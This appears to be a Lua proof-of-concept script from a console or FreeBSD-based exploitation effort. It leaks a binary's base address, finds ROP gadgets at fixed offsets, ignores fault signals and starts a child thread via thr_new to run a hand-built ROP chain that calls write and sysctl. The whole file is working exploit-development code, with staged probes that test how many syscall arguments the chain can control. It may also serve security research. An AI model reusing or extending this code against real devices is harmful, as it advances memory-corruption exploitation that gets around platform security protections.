-- CRASH_CLASS: MODERATE
-- PROBE 384a: Multi-arg syscall from child thread — write + sysctl PoC
--
-- Context: 271g confirmed 1-arg close(fd) via child ROP. 272a confirmed full
-- gadget catalog: pop_rdi/rsi/rdx/rcx/rax + mov [rdi],rax;ret.
-- No pop_r8/r9 in eboot — max 4 CONTROLLED args. But if the kernel zeroes
-- r8/r9 at thr_new child entry, we get 6-arg for free (new/newlen=0 = read sysctl).
--
-- Tests:
--   [C] 3-arg write(fd, buf, 16) through socketpair — data delivery
--   [D] 4+arg sysctl(mib, 2, outbuf, oldlenp, r8=?, r9=?) — kern.ostype
-- Child captures return values via mov [rdi], rax gadget after each syscall.

print("=== PROBE 384a: child thread multi-arg syscall ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- [A] eboot base + gadgets
print("")
print("[A] eboot + gadgets")
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi], rax; ret

-- Verify mov [rdi], rax; ret  (48 89 07 C3)
local vb = rd(N(eb) + 0x92C67)
if vb then
    local b0, b1 = vb % 256, math.floor(vb / 256) % 256
    local b2, b3 = math.floor(vb / 65536) % 256, math.floor(vb / 16777216) % 256
    local ok_v = (b0 == 0x48 and b1 == 0x89 and b2 == 0x07 and b3 == 0xC3)
    print(string.format("  mov_[rdi]_rax: %02X %02X %02X %02X %s", b0, b1, b2, b3, ok_v and "OK" or "MISMATCH"))
    if not ok_v then print("ABORT: gadget mismatch"); return end
end

if not alive() then print("DEAD after setup"); return end

-- Ignore SIGSEGV(11) + SIGSYS(12) for child faults (sysctl with garbage r8 may fault)
local sig_buf = memory.alloc(0x20)
wq(N(sig_buf), uint64(1))        -- SIG_IGN
wd(N(sig_buf) + 8, 0)
wq(N(sig_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sig_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sig_buf, uint64(0)) end)
print("SIGSEGV+SIGSYS ignored")

-- [B] socketpair for write test
print("")
print("[B] socketpair")
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(1), uint64(0), sv)  -- AF_UNIX SOCK_STREAM
end)
local sp_ret = ok_sp and N(rv_sp) or -999
local rd_fd = rd(N(sv)) or -1
local wr_fd = rd(N(sv) + 4) or -1
print(string.format("socketpair ret=%d  rd_fd=%d  wr_fd=%d", sp_ret, rd_fd, wr_fd))
if rd_fd < 0 or wr_fd < 0 then
    -- Try SOCK_DGRAM
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    ok_sp, rv_sp = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), sv)  -- AF_UNIX SOCK_DGRAM
    end)
    sp_ret = ok_sp and N(rv_sp) or -999
    rd_fd = rd(N(sv)) or -1
    wr_fd = rd(N(sv) + 4) or -1
    print(string.format("fallback DGRAM ret=%d  rd_fd=%d  wr_fd=%d", sp_ret, rd_fd, wr_fd))
end
if rd_fd < 0 or wr_fd < 0 then print("ABORT: no socketpair"); return end

-- Prepare write data: "CHILD_ROP_OK!!\0"  (16 bytes with padding)
local data_buf = memory.alloc(32)
local da = N(data_buf)
wd(da,      0x4C494843)  -- "CHIL"
wd(da + 4,  0x4F525F44)  -- "D_RO"
wd(da + 8,  0x4F5F50)    -- "P_O\0" (only 3 chars + null)
wd(da + 12, 0x2121214B)  -- "K!!!"
local data_len = 16

-- sysctl args: kern.ostype {1, 14}
local mib_buf = memory.alloc(8)
wd(N(mib_buf), 1)       -- CTL_KERN
wd(N(mib_buf) + 4, 14)  -- KERN_OSTYPE

local out_buf = memory.alloc(64)
for i = 0, 60, 4 do wd(N(out_buf) + i, 0xDEAD0000) end

local olen_buf = memory.alloc(8)
wq(N(olen_buf), uint64(64))

-- Result slots (sentinel-filled)
local res1 = memory.alloc(8);  wq(N(res1), uint64(0xBAD1BAD1))
local res2 = memory.alloc(8);  wq(N(res2), uint64(0xBAD2BAD2))

-- [C] Build ROP chain
print("")
print("[C] ROP chain")

local stk = memory.alloc(0x8000)
local stk_base = N(stk)
local stk_size = 0x4000
local raw_top = stk_base + stk_size
local rsp = raw_top - (raw_top % 16) - 8

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- Phase 1: write(wr_fd, data_buf, 16)
-- rdi = arg = wr_fd (from thr_new arg parameter)
emit(g_pop_rsi);       emit(uint64(da))         -- rsi = data buffer
emit(g_pop_rdx);       emit(uint64(data_len))   -- rdx = length
emit(g_pop_rax);       emit(uint64(4))          -- SYS_write
emit(stub)                                       -- → write(rdi=wr_fd, rsi, rdx)

-- Save write result
emit(g_pop_rdi);       emit(uint64(N(res1)))
emit(g_mov_m_rax)                                -- [res1] = rax

-- Phase 2: sysctl(mib, 2, outbuf, oldlenp, r8=?, r9=?)
emit(g_pop_rdi);       emit(uint64(N(mib_buf)))  -- rdi = mib
emit(g_pop_rsi);       emit(uint64(2))           -- rsi = namelen
emit(g_pop_rdx);       emit(uint64(N(out_buf)))  -- rdx = outbuf
emit(g_pop_rcx);       emit(uint64(N(olen_buf))) -- rcx → r10 = oldlenp
emit(g_pop_rax);       emit(uint64(202))         -- SYS___sysctl
emit(stub)                                        -- → sysctl(...)

-- Save sysctl result
emit(g_pop_rdi);       emit(uint64(N(res2)))
emit(g_mov_m_rax)                                -- [res2] = rax

-- Exit: thr_exit(0)
emit(g_pop_rdi);       emit(uint64(0))
emit(g_pop_rax);       emit(uint64(431))         -- SYS_thr_exit
emit(stub)

print(string.format("  %d qwords, %d bytes", off / 8, off))

-- [D] Spawn child
print("")
print("[D] spawn child (arg=wr_fd=" .. wr_fd .. ")")

local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)          -- start_func
wq(pa + 0x08, uint64(wr_fd))       -- arg → rdi at entry
wq(pa + 0x10, uint64(stk_base))    -- stack_base
wq(pa + 0x18, uint64(stk_size))    -- stack_size
local tid_buf = memory.alloc(8)
wq(N(tid_buf), uint64(0))
wq(pa + 0x30, tid_buf)             -- child_tid

local ok_t, rv_t = pcall(function() return mk(455)(par, uint64(0x38)) end)
local thr_ret = ok_t and N(rv_t) or -999
local child_tid = rd(N(tid_buf))
print(string.format("  thr_new ret=%d  tid=%s", thr_ret, tostring(child_tid)))

if thr_ret ~= 0 then
    print("ABORT: thr_new failed")
    pcall(function() mk(6)(uint64(wr_fd)) end)
    pcall(function() mk(6)(uint64(rd_fd)) end)
    return
end

-- Wait for child
for w = 1, 30000 do local _ = rd(stk_base) end

if not alive() then print("DEAD after child"); return end

-- [E] Check write result
print("")
print("[E] write() result")

local r1_raw = rq(N(res1))
local r1_h, r1_l = get_hi_lo(r1_raw)
local r1_val = r1_l
if r1_h ~= 0 and r1_h ~= nil then
    if r1_h == 0xFFFFFFFF or r1_h == -1 then r1_val = -1
    else r1_val = r1_l end
end
print(string.format("  write() raw=%s  interpreted=%d", fmt(r1_raw), r1_val))

-- Read from socketpair
local recv = memory.alloc(32)
for i = 0, 28, 4 do wd(N(recv) + i, 0) end
local ok_r, rv_r = pcall(function()
    return mk(3)(uint64(rd_fd), recv, uint64(32))  -- SYS_read
end)
local read_ret = ok_r and N(rv_r) or -999
print(string.format("  read() ret=%d", read_ret))

if read_ret > 0 then
    local function dw2s(dw)
        if dw < 0 then dw = dw + 0x100000000 end
        local s = ""
        for i = 0, 3 do
            local b = math.floor(dw / (256 ^ i)) % 256
            if b >= 32 and b < 127 then s = s .. string.char(b)
            elseif b == 0 then break
            else s = s .. "." end
        end
        return s
    end
    local d0 = rd(N(recv)) or 0
    local d1 = rd(N(recv) + 4) or 0
    local d2 = rd(N(recv) + 8) or 0
    local d3 = rd(N(recv) + 12) or 0
    local got = dw2s(d0) .. dw2s(d1) .. dw2s(d2) .. dw2s(d3)
    print(string.format("  received: \"%s\"", got))
    if d0 == 0x4C494843 then
        print("  *** 3-ARG WRITE FROM CHILD: CONFIRMED ***")
    else
        print("  data mismatch")
    end
else
    print("  read failed — child write may not have executed")
end

-- [F] Check sysctl result
print("")
print("[F] sysctl() result")

local r2_raw = rq(N(res2))
local r2_h, r2_l = get_hi_lo(r2_raw)
local r2_val = r2_l
if r2_h ~= 0 and r2_h ~= nil then
    if r2_h == 0xFFFFFFFF or r2_h == -1 then r2_val = -1 end
end
print(string.format("  sysctl() raw=%s  interpreted=%d", fmt(r2_raw), r2_val))

local od0 = rd(N(out_buf)) or 0
local od1 = rd(N(out_buf) + 4) or 0
local od2 = rd(N(out_buf) + 8) or 0
print(string.format("  outbuf dwords: %08X %08X %08X", od0, od1, od2))

local olen = rq(N(olen_buf))
print(string.format("  oldlenp: %s", fmt(olen)))

-- Decode sysctl output
if od0 ~= 0xDEAD0000 and od0 ~= 0 then
    local function dw2s(dw)
        if dw < 0 then dw = dw + 0x100000000 end
        local s = ""
        for i = 0, 3 do
            local b = math.floor(dw / (256 ^ i)) % 256
            if b >= 32 and b < 127 then s = s .. string.char(b)
            elseif b == 0 then break
            else s = s .. "." end
        end
        return s
    end
    print(string.format("  kern.ostype: \"%s\"", dw2s(od0) .. dw2s(od1)))
end

-- [G] Assessment
print("")
print("[G] ASSESSMENT:")
local write_ok = (r1_val > 0)
local sysctl_ok = (r2_val == 0 and od0 ~= 0xDEAD0000)

if write_ok then
    print("  3-arg syscall (write): CONFIRMED")
else
    print("  3-arg syscall (write): FAILED (ret=" .. r1_val .. ")")
end

if sysctl_ok then
    print("  6-arg syscall (sysctl): CONFIRMED")
    print("  *** r8/r9 = 0 at child entry → FULL 6-ARG CAPABILITY ***")
elseif r2_val == 0 and od0 == 0xDEAD0000 then
    print("  sysctl ret=0 but buffer untouched — kernel accepted but no output")
    print("  r8/r9 status: INCONCLUSIVE")
elseif r2_val == -1 then
    print("  sysctl ret=-1 — r8/r9 likely nonzero (EFAULT on newp copyin)")
    print("  max confirmed args from child: 4")
else
    print("  sysctl result unclear: ret=" .. r2_val)
end

-- Cleanup
pcall(function() mk(6)(uint64(wr_fd)) end)
pcall(function() mk(6)(uint64(rd_fd)) end)

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 384a COMPLETE ===")
